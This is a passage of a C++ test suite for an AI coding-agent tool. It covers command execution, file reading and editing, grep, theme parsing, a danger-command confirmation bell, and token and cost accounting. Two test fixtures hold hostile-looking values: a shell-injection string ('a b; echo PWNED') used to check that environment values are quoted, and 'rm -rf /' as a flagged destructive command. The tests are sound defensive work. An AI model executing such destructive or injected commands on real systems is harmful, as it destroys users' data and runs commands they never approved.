    try { c.load(path); } catch ( ... ) { threw = true; }
    check(!threw, "non-array conversation file does not throw");

    std::filesystem::remove(path);
}

static void test_run_command_robustness() {
    std::cout << "run_command robustness" << std::endl;
    agent::tools::RunCommand rc;

    std::string e = rc.execute(JSON::Object{{ "command", "exit 3" }});
    check(e.find("exit code: 3") != std::string::npos, "reports non-zero exit code");

    std::string ok = rc.execute(JSON::Object{{ "command", "true" }});
    check(ok.find("no output") != std::string::npos, "empty success reported clearly");

    // Over-long output keeps the head AND the tail (build errors live at the end).
    std::string big = rc.execute(JSON::Object{{ "command",
        "i=0; while [ $i -lt 20000 ]; do echo \"line $i padding padding\"; i=$((i+1)); done" }});
    check(big.find("KB omitted") != std::string::npos, "large output is trimmed with a marker");
    check(big.find("line 0 padding") != std::string::npos, "head of the output kept");
    check(big.find("line 19999 padding") != std::string::npos, "tail of the output kept");
    check(big.size() < 120 * 1024, "trimmed output respects the cap");

    // Ctrl-C (turn_abort) interrupts a hung command instead of blocking forever.
    agent::turn_abort.store(false);
    std::thread aborter([]() {
        std::this_thread::sleep_for(std::chrono::milliseconds(400));
        agent::turn_abort.store(true);
    });
    auto begin = std::chrono::steady_clock::now();
    std::string hung = rc.execute(JSON::Object{{ "command", "sleep 20" }});
    long secs = std::chrono::duration_cast<std::chrono::seconds>(
        std::chrono::steady_clock::now() - begin).count();
    aborter.join();
    agent::turn_abort.store(false);
    check(hung.find("interrupted") != std::string::npos, "aborted command reports interruption");
    check(secs < 10, "aborted command returns promptly");
}

static void test_read_file_robustness() {
    std::cout << "read_file robustness" << std::endl;
    agent::tools::ReadFile rf;

    // Multi-line file: offset/limit windowing.
    {
        std::ofstream o("/tmp/ai_rf.txt");
        for ( int i = 1; i <= 6; ++i ) o << "line " << i << "\n";
    }
    std::string all = rf.execute(JSON::Object{{ "path", "/tmp/ai_rf.txt" }});
    check(all.find("line 1") != std::string::npos && all.find("line 6") != std::string::npos, "reads whole small file");

    std::string win = rf.execute(JSON::Object{{ "path", "/tmp/ai_rf.txt" }, { "offset", 2 }, { "limit", 2 }});
    check(win.find("[lines 2-3 of 6]") != std::string::npos, "windowed read shows range header");
    check(win.find("line 2") != std::string::npos && win.find("line 4") == std::string::npos, "windowed read returns only the range");

    // Binary file.
    {
        std::ofstream o("/tmp/ai_rf.bin", std::ios::binary);
        char data[] = { 'h', 'i', 0, 1, 2, 3, 'x' };
        o.write(data, sizeof(data));
    }
    std::string bin = rf.execute(JSON::Object{{ "path", "/tmp/ai_rf.bin" }});
    check(bin.find("binary file") != std::string::npos, "binary file is refused");

    // Empty file.
    { std::ofstream o("/tmp/ai_rf_empty.txt"); }
    std::string empty = rf.execute(JSON::Object{{ "path", "/tmp/ai_rf_empty.txt" }});
    check(empty.find("empty file") != std::string::npos, "empty file reported");

    // Bulk read: several files in one call, each under a header.
    { std::ofstream o("/tmp/ai_rf_a.txt"); o << "alpha one\nalpha two\n"; }
    { std::ofstream o("/tmp/ai_rf_b.txt"); o << "beta one\n"; }
    std::string bulk = rf.execute(JSON::Object{ { "paths", JSON::Array{ "/tmp/ai_rf_a.txt", "/tmp/ai_rf_b.txt" } } });
    check(bulk.find("===== /tmp/ai_rf_a.txt =====") != std::string::npos &&
          bulk.find("===== /tmp/ai_rf_b.txt =====") != std::string::npos, "bulk read shows a header per file");
    check(bulk.find("alpha one") != std::string::npos && bulk.find("beta one") != std::string::npos, "bulk read returns each file's content");

    // A missing file in the list is noted, the rest still read.
    std::string bulk2 = rf.execute(JSON::Object{ { "paths", JSON::Array{ "/tmp/ai_rf_a.txt", "/tmp/nope_xyz.txt" } } });
    check(bulk2.find("alpha one") != std::string::npos && bulk2.find("cannot open") != std::string::npos, "bulk read notes a missing file but keeps going");

    std::filesystem::remove("/tmp/ai_rf.txt");
    std::filesystem::remove("/tmp/ai_rf.bin");
    std::filesystem::remove("/tmp/ai_rf_empty.txt");
    std::filesystem::remove("/tmp/ai_rf_a.txt");
    std::filesystem::remove("/tmp/ai_rf_b.txt");
}

static void test_parallel_tool_safety() {
    std::cout << "parallel read-only tool execution" << std::endl;
    for ( int i = 1; i <= 4; ++i ) {
        std::ofstream o("/tmp/ai_par_" + std::to_string(i) + ".txt");
        o << "CONTENT" << i << "\n";
    }
    agent::tools::Registry reg;
    reg.register_defaults();
    reg.set_mode(agent::tools::ConfirmMode::automatic);

    std::vector<std::string> res(4);
    std::vector<std::thread> th;
    for ( int i = 0; i < 4; ++i )
        th.emplace_back([&reg, &res, i]() {
            res[i] = reg.execute("read_file", JSON::Object{ { "path", "/tmp/ai_par_" + std::to_string(i + 1) + ".txt" } });
        });
    for ( auto& t : th ) t.join();

    bool ok = true;
    for ( int i = 0; i < 4; ++i )
        if ( res[i].find("CONTENT" + std::to_string(i + 1)) == std::string::npos ) ok = false;
    check(ok, "concurrent read_file returns each file's content correctly (no cross-talk)");

    for ( int i = 1; i <= 4; ++i )
        std::filesystem::remove("/tmp/ai_par_" + std::to_string(i) + ".txt");
}

static void test_run_command_options() {
    std::cout << "run_command cwd/env/timeout" << std::endl;
    agent::tools::RunCommand rc;

    std::string pwd = rc.execute(JSON::Object{ { "command", "pwd" }, { "cwd", "/tmp" } });
    check(pwd.find("/tmp") != std::string::npos, "cwd runs the command in the given directory");

    std::string ev = rc.execute(JSON::Object{
        { "command", "echo $AI_TEST_VAR" },
        { "env", JSON::Object{ { "AI_TEST_VAR", "hello123" } } } });
    check(ev.find("hello123") != std::string::npos, "env var is visible to the command");
    check(std::getenv("AI_TEST_VAR") == nullptr, "env var never touches the global environment");

    // A value with shell metacharacters is passed literally (quoted, not injected).
    std::string evq = rc.execute(JSON::Object{
        { "command", "printf '%s' \"$AI_TEST_Q\"" },
        { "env", JSON::Object{ { "AI_TEST_Q", "a b; echo PWNED" } } } });
    check(evq.find("a b; echo PWNED") != std::string::npos && evq.find("\nPWNED") == std::string::npos,
          "env value with metacharacters is quoted, not executed");

    std::string to = rc.execute(JSON::Object{ { "command", "sleep 5" }, { "timeout", 1 } });
    check(to.find("timed out") != std::string::npos, "timeout kills a long-running command");
}

static void test_edit_file() {
    std::cout << "edit_file targeted edits" << std::endl;
    agent::tools::EditFile ef;
    std::string path = "/tmp/ai_edit.txt";

    auto write = [&](const std::string& s) { std::ofstream o(path, std::ios::binary); o << s; };
    auto read = [&]() { std::ifstream i(path, std::ios::binary); std::stringstream ss; ss << i.rdbuf(); return ss.str(); };

    // Unique replacement.
    write("alpha\nbeta\ngamma\n");
    std::string r = ef.execute(JSON::Object{{ "path", path }, { "old_string", "beta" }, { "new_string", "BETA" }});
    check(r.rfind("ok:", 0) == 0, "unique edit succeeds");
    check(read() == "alpha\nBETA\ngamma\n", "unique edit applied");

    // Ambiguous match without replace_all is refused.
    write("x\nx\nx\n");
    std::string amb = ef.execute(JSON::Object{{ "path", path }, { "old_string", "x" }, { "new_string", "y" }});
    check(amb.rfind("error:", 0) == 0 && amb.find("appears 3 times") != std::string::npos, "ambiguous edit refused");
    check(read() == "x\nx\nx\n", "ambiguous edit does not modify the file");

    // replace_all.
    std::string all = ef.execute(JSON::Object{{ "path", path }, { "old_string", "x" }, { "new_string", "y" }, { "replace_all", true }});
    check(all.find("3 replacements") != std::string::npos, "replace_all replaces every occurrence");
    check(read() == "y\ny\ny\n", "replace_all applied");

    // Not found.
    std::string nf = ef.execute(JSON::Object{{ "path", path }, { "old_string", "zzz" }, { "new_string", "q" }});
    check(nf.find("not found") != std::string::npos, "missing old_string reported");

    // read_file normalises UTF-8 punctuation, so old_string is built in ASCII; the
    // edit must still match the raw bytes (via the normalised-mapping fallback) and
    // must NOT rewrite the untouched bytes (e.g. a BOM / smart quote elsewhere).
    write("\xef\xbb\xbf" "title \xe2\x80\x94 x\nkeep \xe2\x80\x9cq\xe2\x80\x9d\n"); // BOM + em dash + smart quotes
    std::string uni = ef.execute(JSON::Object{{ "path", path }, { "old_string", "title -- x" }, { "new_string", "title -- y" }});
    check(uni.rfind("ok:", 0) == 0, "edit matches normalised old_string against raw UTF-8");
    check(read() == "\xef\xbb\xbf" "title -- y\nkeep \xe2\x80\x9cq\xe2\x80\x9d\n",
          "raw BOM and untouched smart quotes preserved; only the target line changed");

    // Identical old/new.
    std::string id = ef.execute(JSON::Object{{ "path", path }, { "old_string", "y" }, { "new_string", "y" }, { "replace_all", true }});
    check(id.find("identical") != std::string::npos, "identical old/new refused");

    // Missing file.
    std::string mf = ef.execute(JSON::Object{{ "path", "/tmp/does_not_exist_edit.txt" }, { "old_string", "a" }, { "new_string", "b" }});
    check(mf.find("does not exist") != std::string::npos, "editing a missing file refused");

    // A null or missing `path` gives a clear error, NOT "file does not exist: null"
    // (JSON null -> "null" used to slip past the empty-check).
    std::string np = ef.execute(JSON::Object{{ "path", nullptr }, { "old_string", "a" }, { "new_string", "b" }});
    check(np.find("provide a `path`") != std::string::npos && np.find("null") == std::string::npos,
          "null path gives a clear error, not 'does not exist: null'");
    std::string mp = ef.execute(JSON::Object{{ "old_string", "a" }, { "new_string", "b" }});
    check(mp.find("provide a `path`") != std::string::npos, "missing path key gives a clear error");

    // Multi-edit: several edits in one atomic call, applied in order.
    write("one\ntwo\nthree\n");
    std::string me = ef.execute(JSON::Object{ { "path", path }, { "edits", JSON::Array{
        JSON::Object{ { "old_string", "one" }, { "new_string", "1" } },
        JSON::Object{ { "old_string", "three" }, { "new_string", "3" } } } } });
    check(me.find("2 edits") != std::string::npos, "multi-edit reports the edit count");
    check(read() == "1\ntwo\n3\n", "multi-edit applies all edits");

    // Sequential: a later edit sees an earlier edit's result.
    write("aaa\n");
    ef.execute(JSON::Object{ { "path", path }, { "edits", JSON::Array{
        JSON::Object{ { "old_string", "aaa" }, { "new_string", "bbb" } },
        JSON::Object{ { "old_string", "bbb" }, { "new_string", "ccc" } } } } });
    check(read() == "ccc\n", "multi-edit is sequential (later edit sees earlier result)");

    // Atomic: if one edit fails, the file is left unchanged.
    write("keep me\n");
    std::string atom = ef.execute(JSON::Object{ { "path", path }, { "edits", JSON::Array{
        JSON::Object{ { "old_string", "keep" }, { "new_string", "KEEP" } },
        JSON::Object{ { "old_string", "nonexistent" }, { "new_string", "x" } } } } });
    check(atom.find("edit #2") != std::string::npos && atom.find("left unchanged") != std::string::npos, "multi-edit reports which edit failed");
    check(read() == "keep me\n", "a failed multi-edit leaves the file unchanged (atomic)");

    // Near-miss diagnosis: a whitespace mismatch points at the real region.
    write("int main() {\n    do_thing(a, b);\n    return 0;\n}\n");
    std::string miss = ef.execute(JSON::Object{
        { "path", path },
        { "old_string", "int main() {\n  do_thing(a, b);\n  return 0;\n}" }, // 2-space indent vs 4
        { "new_string", "X" } });
    check(miss.find("closest on-disk region is lines 1-4") != std::string::npos,
          "near-miss reports the region's line span");
    check(miss.find("    do_thing(a, b);") != std::string::npos, "near-miss shows the on-disk text");
    check(miss.find("no need to re-read") != std::string::npos, "near-miss tells the model not to re-read");
    std::string nomiss = ef.execute(JSON::Object{
        { "path", path },
        { "old_string", "completely unrelated text that matches nothing at all" },
        { "new_string", "X" } });
    check(nomiss.find("closest on-disk region") == std::string::npos,
          "no near-miss hint when nothing is close");

    // Post-edit verification snippet: success returns the touched region.
    write("l1\nl2\nl3\nl4\nl5\nl6\nl7\nl8\nl9\n");
    std::string ok = ef.execute(JSON::Object{
        { "path", path }, { "old_string", "l5" }, { "new_string", "l5x" } });
    check(ok.find("[verify: lines 2-8]") != std::string::npos, "verify snippet with line span");
    check(ok.find("5: l5x") != std::string::npos, "verify snippet shows the new text with line numbers");

    std::filesystem::remove(path);
}

static void test_workflows_menu() {
    std::cout << "workflows drill-down menu (runs → steps → content)" << std::endl;
    agent::Config cfg;
    agent::Conversation conv;
    agent::TokenStats stats;
    agent::InlineRepl repl(nullptr, cfg, conv, stats);
    repl.set_workflows_provider([]() {
        std::vector<agent::WorkflowRun> runs;
        agent::WorkflowRun r;
        r.id = 7; r.name = "build stuff"; r.status = "running"; r.parallel = true;
        agent::WorkflowStep s1; s1.task = "compile the code"; s1.status = "done"; s1.result = "compiled OK";
        agent::WorkflowStep s2; s2.task = "run the tests"; s2.status = "running";
        r.steps = { s1, s2 };
        runs.push_back(r);
        return runs;
    });

    // Capture everything the menu writes to the terminal (STDOUT_FILENO) so the
    // rendered rows can be asserted. Theme codes surround whole rows, so the text
    // substrings survive intact — no need to strip escapes.
    auto capture = [](std::function<void()> fn) {
        fflush(stdout);
        int saved = dup(STDOUT_FILENO);
        int pfd[2];
        if ( pipe(pfd) != 0 ) return std::string();
        dup2(pfd[1], STDOUT_FILENO); close(pfd[1]);
        fn();
        dup2(saved, STDOUT_FILENO); close(saved);
        int fl = fcntl(pfd[0], F_GETFL);
        fcntl(pfd[0], F_SETFL, fl | O_NONBLOCK);
        std::string out; char buf[16384]; ssize_t n;
        while (( n = read(pfd[0], buf, sizeof(buf))) > 0 ) out.append(buf, static_cast<size_t>(n));
        close(pfd[0]);
        return out;
    };

    std::string lvl0 = capture([&]{ repl.open_workflows_menu(); });
    check(lvl0.find("build stuff") != std::string::npos, "runs level shows the run name");
    check(lvl0.find("[2 steps]") != std::string::npos, "runs level shows the step-count badge");
    check(lvl0.find("1/2") != std::string::npos, "runs level shows done/total");
    check(lvl0.find("\xe2\x96\xb8") != std::string::npos, "runs level shows the running glyph ▸");

    std::string lvl1 = capture([&]{ repl.workflow_enter(); }); // drill into steps
    check(lvl1.find("compile the code") != std::string::npos, "steps level lists the first step");
    check(lvl1.find("run the tests") != std::string::npos, "steps level lists the second step");
    check(lvl1.find("build stuff") != std::string::npos, "steps level breadcrumb names the run");

    std::string lvl2 = capture([&]{ repl.workflow_enter(); }); // open step 1's content
    check(lvl2.find("compiled OK") != std::string::npos, "step content shows the result");

    capture([&]{ repl.workflow_up(); }); // content → steps
    capture([&]{ repl.workflow_up(); }); // steps → runs
    check(repl.in_list_menu(), "still in the menu after backing up to the runs level");
    capture([&]{ repl.workflow_up(); }); // runs → close
    check(!repl.in_list_menu(), "esc at the runs level closes the menu");

    // A run vanishing while its step content is open must fall back to the runs
    // level cleanly (build_workflow_level's _wf_level==1 + no-run path).
    {
        bool vanish = false;
        agent::InlineRepl r2(nullptr, cfg, conv, stats);
        r2.set_workflows_provider([&vanish]() {
            std::vector<agent::WorkflowRun> v;
            if ( !vanish ) {
                agent::WorkflowRun r; r.id = 3; r.name = "x"; r.status = "running";
                agent::WorkflowStep s; s.task = "t"; s.status = "running";
                r.steps = { s, s, s };
                v.push_back(r);
            }
            return v;
        });
        capture([&]{ r2.open_workflows_menu(); }); // level 0
        capture([&]{ r2.workflow_enter(); });      // level 1 (steps)
        capture([&]{ r2.workflow_enter(); });      // level 2 (step content)
        vanish = true;                             // the run disappears
        capture([&]{ r2.workflow_up(); });         // content → build at level 1 → fallback to runs
        check(r2.in_list_menu(), "menu survives a run vanishing while viewing step content");
        capture([&]{ r2.workflow_up(); });         // runs → close
        check(!r2.in_list_menu(), "closes cleanly after the vanish fallback");
    }
}

static void test_themes() {
    std::cout << "colour themes" << std::endl;
    check(agent::theme_by_name("cool").name == "cool", "cool theme resolves by name");
    check(agent::theme_by_name("rose").name == "rose", "rose theme resolves by name");
    check(agent::theme_by_name("nope").name == "dark", "unknown theme falls back to dark");
    for ( const char* n : { "dark", "light", "warm", "cool", "rose" }) {
        agent::Theme t = agent::theme_by_name(n);
        bool all_set = !t.user.empty() && !t.ai.empty() && !t.command.empty() &&
                       !t.dim.empty() && !t.accent.empty() && !t.danger.empty() &&
                       !t.warn.empty() && !t.kw.empty() && !t.str.empty() &&
                       !t.num.empty() && !t.type.empty();
        check(all_set, std::string(n) + " theme sets every role");
        check(t.user != t.ai, std::string(n) + " theme distinguishes the two speakers");
    }

    // Custom theme: a base palette with per-role overrides.
    check(agent::theme_color_sgr("110") == "\033[38;5;110m", "a 256-colour index parses");
    check(agent::theme_color_sgr("#7aa2f7") == "\033[38;2;122;162;247m", "a hex triplet parses as truecolour");
    check(agent::theme_color_sgr("7aa2f7") == "\033[38;2;122;162;247m", "hex without '#' also parses");
    check(agent::theme_color_sgr("amber") == agent::theme_color_sgr("179"), "a colour name maps to the palette");
    check(agent::theme_color_sgr("256").empty() && agent::theme_color_sgr("nosuchcolour").empty() &&
          agent::theme_color_sgr("").empty(), "out-of-range / unknown / empty colours are rejected");
    check(agent::theme_role_name_valid("ai") && !agent::theme_role_name_valid("background"),
          "role names are validated");

    {
        agent::Theme base = agent::theme_by_name("cool");
        agent::Theme c = agent::theme_custom("cool", {{ "ai", "#7aa2f7" }, { "dim", "244" }});
        check(c.name == "custom", "the custom theme is named custom");
        check(c.ai == "\033[38;2;122;162;247m" && c.dim == "\033[38;5;244m",
              "overridden roles take the configured colour");
        check(c.user == base.user && c.warn == base.warn,
              "roles without an override keep the base palette");
    }
    {
        // A typo costs one colour, never the whole theme.
        agent::Theme d = agent::theme_by_name("dark");
        agent::Theme c = agent::theme_custom("dark", {{ "ai", "notacolour" }, { "bogusrole", "12" }});
        check(c.ai == d.ai, "an unparseable colour leaves the base colour in place");
        check(c.user == d.user && c.dim == d.dim, "an unknown role is ignored");
    }
    check(agent::theme_custom("custom", {}).user == agent::theme_by_name("dark").user,
          "a self-referential base falls back to dark");
}

static void test_confirm_danger_bell() {
    std::cout << "danger-command confirmation bell" << std::endl;
    agent::Conversation conv;
    agent::TokenStats stats;

    auto has_bell = [](const std::string& s) { return s.find('\a') != std::string::npos; };
    auto capture = [](std::function<void()> fn) {
        fflush(stdout);
        int saved = dup(STDOUT_FILENO);
        int pfd[2];
        if ( pipe(pfd) != 0 ) return std::string();
        dup2(pfd[1], STDOUT_FILENO); close(pfd[1]);
        fn();
        dup2(saved, STDOUT_FILENO); close(saved);
        int fl = fcntl(pfd[0], F_GETFL);
        fcntl(pfd[0], F_SETFL, fl | O_NONBLOCK);
        std::string out; char buf[16384]; ssize_t n;
        while (( n = read(pfd[0], buf, sizeof(buf))) > 0 ) out.append(buf, static_cast<size_t>(n));
        close(pfd[0]);
        return out;
    };
    auto danger = []() {
        agent::tools::ConfirmRequest r;
        r.tool = "run_command"; r.summary = "rm -rf /"; r.danger = "recursive force delete";
        return r;
    };
    auto safe = []() {
        agent::tools::ConfirmRequest r;
        r.tool = "run_command"; r.summary = "ls -la"; // danger empty
        return r;
    };

    // A dangerous command rings at every non-silent level, immediately (independent
    // of the turn's elapsed time).
    for ( const char* lvl : { "ask_user", "question", "attention", "always" }) {
        agent::Config c; c.bell = lvl;
        agent::InlineRepl r(nullptr, c, conv, stats);
        check(has_bell(capture([&]{ r.render_confirm_dialog(danger()); })),
              std::string("danger command rings at bell=") + lvl);
    }
    // never stays silent even for a dangerous command.
    {
        agent::Config c; c.bell = "never";
        agent::InlineRepl r(nullptr, c, conv, stats);
        check(!has_bell(capture([&]{ r.render_confirm_dialog(danger()); })),
              "danger command stays silent at bell=never");
    }
    // A safe command at the lowest non-silent level does not ring (the normal
    // tool-permission bell needs the higher 'attention' threshold).
    {
        agent::Config c; c.bell = "ask_user";
        agent::InlineRepl r(nullptr, c, conv, stats);
        check(!has_bell(capture([&]{ r.render_confirm_dialog(safe()); })),
              "safe command does not ring at bell=ask_user");
    }
}

static void test_grep_robustness() {
    std::cout << "grep robustness" << std::endl;
    agent::tools::Grep g;
    std::filesystem::remove_all("/tmp/ai_grep_tree");
    std::filesystem::create_directories("/tmp/ai_grep_tree/nested");
    {
        std::ofstream o("/tmp/ai_grep.txt");
        o << "alpha 1\n" << "beta 2\n" << "a.b\n" << "axb\n";
    }
    {
        std::ofstream o("/tmp/ai_grep_tree/nested/needle.txt");
        o << "alpha in a subtree\n";
    }
    {
        std::ofstream o("/tmp/ai_grep_tree/binary.bin", std::ios::binary);
        o.write("\x00\x01\x02\x03needle", 8);
    }

    std::string re = g.execute(JSON::Object{{ "path", "/tmp/ai_grep.txt" }, { "pattern", "beta [0-9]+" }});
    check(re.find("beta 2") != std::string::npos, "regex matches");

    std::string ic = g.execute(JSON::Object{{ "path", "/tmp/ai_grep.txt" }, { "pattern", "ALPHA" }, { "ignore_case", true }});
    check(ic.find("alpha 1") != std::string::npos, "ignore_case matches");

    std::string bad = g.execute(JSON::Object{{ "path", "/tmp/ai_grep.txt" }, { "pattern", "[unterminated" }});
    check(bad.find("invalid regular expression") != std::string::npos, "invalid regex reported");

    std::string none = g.execute(JSON::Object{{ "path", "/tmp/ai_grep.txt" }, { "pattern", "zzz" }});
    check(none.find("no matches") != std::string::npos, "no matches reported clearly");

    std::string lit = g.execute(JSON::Object{{ "path", "/tmp/ai_grep.txt" }, { "pattern", "a.b" }, { "literal", true }});
    check(lit.find("a.b") != std::string::npos && lit.find("axb") == std::string::npos, "literal treats '.' literally");

    std::string tree = g.execute(JSON::Object{{ "path", "/tmp/ai_grep_tree" }, { "pattern", "alpha" }});
    check(tree.find("nested/needle.txt") != std::string::npos, "directory grep searches recursively");
    check(tree.find("binary file") == std::string::npos, "directory grep skips binary files quietly");

    std::filesystem::remove("/tmp/ai_grep.txt");
    std::filesystem::remove_all("/tmp/ai_grep_tree");
}

static void test_token_usage() {
    std::cout << "token usage parsing" << std::endl;
    agent::Config cfg;

    agent::providers::OpenAI oai(cfg);
    JSON r = JSON::parse("{\"choices\":[{\"message\":{\"content\":\"hi\"}}],"
                         "\"usage\":{\"prompt_tokens\":1200,\"completion_tokens\":34}}");
    auto o = oai.parse_response(r);
    check(o.input_tokens == 1200, "openai prompt_tokens parsed");
    check(o.output_tokens == 34, "openai completion_tokens parsed");

    agent::providers::Anthropic ant(cfg);
    JSON a = JSON::parse("{\"content\":[{\"type\":\"text\",\"text\":\"hi\"}],"
                         "\"usage\":{\"input_tokens\":900,\"output_tokens\":21}}");
    auto an = ant.parse_response(a);
    check(an.input_tokens == 900, "anthropic input_tokens parsed");
    check(an.output_tokens == 21, "anthropic output_tokens parsed");

    agent::TokenStats stats;
    stats.record(1200, 34);
    stats.record(1500, 40);
    check(stats.context_tokens.load() == 1500, "context tracks latest request");
    check(stats.session_total() == 1200 + 34 + 1500 + 40, "session total accumulates");

    agent::TurnUsage tu;
    tu.turn_number = 37;
    tu.model_requests = 14;
    tu.tool_calls = 13;
    tu.input_tokens = 1842391;
    tu.cached_tokens = 1521804;
    tu.output_tokens = 18422;
    tu.reasoning_tokens = 9817;
    tu.first_request_tokens = 182440;
    tu.peak_request_tokens = 201438;
    tu.elapsed_ms = 222000;
    stats.record_turn(tu);

    agent::TurnUsage got = stats.get_last_turn();
    check(got.turn_number == 37, "turn_number captured");
    check(got.model_requests == 14, "model_requests captured");
    check(got.tool_calls == 13, "tool_calls captured");
    check(got.input_tokens == 1842391, "input_tokens captured");
    check(got.cached_tokens == 1521804, "cached_tokens captured");

    std::string formatted = agent::Repl::format_turn_usage(got);
    check(formatted.find("turn #37 usage:") != std::string::npos, "formatted header present");
    check(formatted.find("1,842,391") != std::string::npos, "formatted input tokens present");
    check(formatted.find("1,521,804 cached") != std::string::npos, "formatted cached tokens present");
    check(formatted.find("320,587 uncached") != std::string::npos, "formatted uncached tokens present");
    check(formatted.find("9,817 reasoning") != std::string::npos, "formatted reasoning present");
    check(formatted.find("3m 42s") != std::string::npos, "formatted duration present");
}

static void test_provider_aware_token_accounting() {
    std::cout << "provider-aware token accounting & pricing" << std::endl;
    agent::Config cfg;

    // 1. Provider pricing rules
    auto openai_rules = cfg.provider_pricing_rules("openai", "gpt-4o");
    check(openai_rules.cache_read_ratio == 0.50, "openai cache read ratio is 50%");
    check(openai_rules.discount_pct() == 50, "openai discount is 50%");

    auto gemini_rules = cfg.provider_pricing_rules("gemini", "gemini-2.5-pro");
    check(gemini_rules.cache_read_ratio == 0.25, "gemini cache read ratio is 25%");
    check(gemini_rules.discount_pct() == 75, "gemini discount is 75%");

    auto claude_rules = cfg.provider_pricing_rules("claude", "claude-sonnet-4");
    check(claude_rules.cache_read_ratio == 0.10, "claude cache read ratio is 10%");
    check(claude_rules.cache_write_ratio == 1.25, "claude cache write ratio is 125%");
    check(claude_rules.discount_pct() == 90, "claude read discount is 90%");

    auto kimi_rules = cfg.provider_pricing_rules("kimi", "kimi-k2");
    check(kimi_rules.cache_read_ratio == 0.20, "kimi cache read ratio is 20%");
    check(kimi_rules.discount_pct() == 80, "kimi discount is 80%");

    auto deepseek_rules = cfg.provider_pricing_rules("openrouter", "deepseek/deepseek-r1");
    check(deepseek_rules.cache_read_ratio == 0.25, "deepseek cache read ratio is 25%");
    check(deepseek_rules.discount_pct() == 75, "deepseek discount is 75%");

    // 2. Cost calculation with provider-specific cache discounts
    cfg.pricing["openai-test"] = agent::ModelPricing{ 10.0, 30.0 };
    cfg.provider = "openai"; cfg.model = "openai-test";
    // 1M total: 500k uncached ($5.00) + 500k cached @ 50% ($2.50) + 100k out @ 30 ($3.00) = $10.50
    double cost_oai = cfg.session_cost(1000000, 100000, 500000);
    check(cost_oai > 10.49 && cost_oai < 10.51, "openai session cost with 50% cache discount");

    cfg.pricing["gemini-test"] = agent::ModelPricing{ 10.0, 30.0 };
    cfg.provider = "gemini"; cfg.model = "gemini-test";
    // 1M total: 500k uncached ($5.00) + 500k cached @ 25% ($1.25) + 100k out @ 30 ($3.00) = $9.25
    double cost_gem = cfg.session_cost(1000000, 100000, 500000);
    check(cost_gem > 9.24 && cost_gem < 9.26, "gemini session cost with 75% cache discount");

    cfg.pricing["claude-test"] = agent::ModelPricing{ 10.0, 30.0 };
    cfg.provider = "claude"; cfg.model = "claude-test";
    // 1M total: 300k uncached ($3.00) + 500k cached @ 10% ($0.50) + 200k created @ 125% ($2.50) + 100k out @ 30 ($3.00) = $9.00
    double cost_claude = cfg.session_cost(1000000, 100000, 500000, 200000);
    check(cost_claude > 8.99 && cost_claude < 9.01, "claude session cost with 10% read and 125% write");

    // 3. Extended price syntax in config
    std::string test_cfg_path = "/tmp/test_price_cfg_" + std::to_string(getpid()) + ".ini";
    {
        std::ofstream ofs(test_cfg_path);
        ofs << "price.custom-model: 20.0/40.0/0.15/1.50\n";
    }
    agent::Config loaded_cfg;
    loaded_cfg.load(test_cfg_path);
    auto p_custom = loaded_cfg.pricing_for("custom-model");
    check(p_custom.has_value(), "custom-model pricing loaded");
    if ( p_custom ) {
        check(p_custom->input_per_mtok == 20.0, "input price parsed");
        check(p_custom->output_per_mtok == 40.0, "output price parsed");
        check(p_custom->cache_read_ratio == 0.15, "custom cache_read_ratio parsed");
        check(p_custom->cache_write_ratio == 1.50, "custom cache_write_ratio parsed");
    }
    std::filesystem::remove(test_cfg_path);

    // 4. Native token usage extraction for reasoning & cache creation
    // OpenAI reasoning_tokens extraction
    agent::providers::OpenAI oai(cfg);
    JSON oai_json = JSON::parse(
        "{\"choices\":[{\"message\":{\"content\":\"hi\"}}],"
        "\"usage\":{\"prompt_tokens\":1000,\"completion_tokens\":500,"
        "\"prompt_tokens_details\":{\"cached_tokens\":400},"
        "\"completion_tokens_details\":{\"reasoning_tokens\":350}}}");
    auto oai_resp = oai.parse_response(oai_json);
    check(oai_resp.input_tokens == 1000, "openai input tokens");
    check(oai_resp.cached_input_tokens == 400, "openai cached input tokens");
    check(oai_resp.output_tokens == 500, "openai output tokens");
    check(oai_resp.reasoning_tokens == 350, "openai reasoning tokens parsed from completion_tokens_details");

    // Gemini thoughtsTokenCount extraction
    agent::providers::Gemini gem(cfg);
    JSON gem_json = JSON::parse(
        "{\"candidates\":[{\"content\":{\"parts\":[{\"text\":\"hi\"}]}}],"
        "\"usageMetadata\":{\"promptTokenCount\":800,\"candidatesTokenCount\":300,"
        "\"cachedContentTokenCount\":200,\"thoughtsTokenCount\":150}}");
    auto gem_resp = gem.parse_response(gem_json);
    check(gem_resp.input_tokens == 800, "gemini input tokens");
    check(gem_resp.cached_input_tokens == 200, "gemini cached input tokens");
    check(gem_resp.output_tokens == 300, "gemini output tokens");
    check(gem_resp.reasoning_tokens == 150, "gemini thoughtsTokenCount parsed");

    // Anthropic cache_creation_input_tokens extraction
    agent::providers::Anthropic ant(cfg);
    JSON ant_json = JSON::parse(
        "{\"content\":[{\"type\":\"text\",\"text\":\"hi\"}],"
        "\"usage\":{\"input_tokens\":500,\"output_tokens\":100,"
        "\"cache_read_input_tokens\":300,\"cache_creation_input_tokens\":200}}");
    auto ant_resp = ant.parse_response(ant_json);
    check(ant_resp.input_tokens == 1000, "anthropic total input tokens");
    check(ant_resp.cached_input_tokens == 300, "anthropic cache read tokens");
    check(ant_resp.cache_creation_input_tokens == 200, "anthropic cache creation tokens");

    // 5. TokenStats & TurnUsage with creation and reasoning
    agent::TokenStats stats;
    stats.record(1000, 200, 300, 150, 80);
    check(stats.context_tokens.load() == 1000, "context_tokens recorded");
    check(stats.session_cached.load() == 300, "session_cached recorded");
    check(stats.session_cache_creation.load() == 150, "session_cache_creation recorded");
    check(stats.session_reasoning.load() == 80, "session_reasoning recorded");
    check(stats.last_cache_creation.load() == 150, "last_cache_creation recorded");
    check(stats.last_reasoning.load() == 80, "last_reasoning recorded");

    agent::TurnUsage tu;
    tu.turn_number = 1;
    tu.model_requests = 2;
    tu.tool_calls = 1;
    tu.input_tokens = 2000;
    tu.cached_tokens = 800;
    tu.cache_creation_tokens = 400;
    tu.output_tokens = 300;
    tu.reasoning_tokens = 150;
    tu.elapsed_ms = 5000;
    std::string turn_fmt = agent::Repl::format_turn_usage(tu);
    check(turn_fmt.find("800 cached") != std::string::npos, "format_turn_usage includes cached");
    check(turn_fmt.find("400 created") != std::string::npos, "format_turn_usage includes created");
    check(turn_fmt.find("800 uncached") != std::string::npos, "format_turn_usage calculates uncached");
    check(turn_fmt.find("150 reasoning") != std::string::npos, "format_turn_usage includes reasoning");

    // 6. Conversation provider-aware estimation
    agent::Conversation conv;
    conv.add_user("void run() { int x = 42; return x * 2; }");
